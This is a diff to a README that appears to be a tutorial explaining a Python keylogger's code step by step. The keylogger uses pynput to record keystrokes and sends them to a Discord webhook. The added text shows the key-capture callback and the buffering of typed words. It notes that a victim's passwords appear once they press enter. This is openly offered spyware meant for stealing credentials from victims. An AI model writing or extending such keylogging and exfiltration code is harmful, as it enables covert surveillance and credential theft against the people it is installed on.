@@ -53,9 +53,28 @@ Now we tell python what our webhook is by using ```sys.argv[1]``` to take our ar
 hook_url = sys.argv[1]
 discord = Discord(url=hook_url)
 ```
-After that is set up we need to define some variables and lists that the logger will use. The ```word``` list is used 
+After that is set up we need to define some variables and lists that the logger will use. The ```word``` list is used to store the keypresses recorded by [pynput](https://pypi.org/project/pynput/) ```last_pressed``` is going to be used later but is for now just set to the time. ```idle_message``` will also be explained more in detail later and is for now set to ```false```
 ```python
 word = []
 last_pressed = time.time()
 idle_message = False
 ```
+Now we move over to where we actually record the key presses.
+First we define our function called ```on_press``` which is what actually does the recording of keypresses. Then we set the variables ```last_pressed``` and ```idle_message``` to global so we can access them within the function. After that we set ```last_pressed``` to ```time.time``` this variable will become important later. And the ```key_pressed =('{0}'.format(
+        key))``` is used for turning the keypress into a string, so if i press the **a** key the variable ```key_pressed``` will store ```'a'```
+```python
+def on_press(key):
+    global last_pressed, idle_message
+    last_pressed = time.time()
+    key_pressed =('{0}'.format(
+        key))
+```
+After this you will see alot of if statements if you read through the code. These will be explained later, but keep in mind that this ```else:``` statement are after all of those if statements.
+This else statement is what happens when a key is pressed (except the ones i will talk about after this, but dont think about that now)
+When this statement is triggered we append the ```key_pressed``` variable previously defined to our ```word``` list. Then we set the variable ```idle_message``` to ```false``` which will become important later.
+```python3
+else:
+ word.append(key_pressed)
+ idle_message = False
+```
+this is where this keylogger stands out from some of the other ones you can find. Instead of sending each keypress individually over discord spamming your server and making it difficult to read, this keylogger sends what you have typed after you have pressed space or enter. This makes the output on discord be words instad of letters, and when the victim types something like a password it also shows up as they press enter. Heres how all that works:
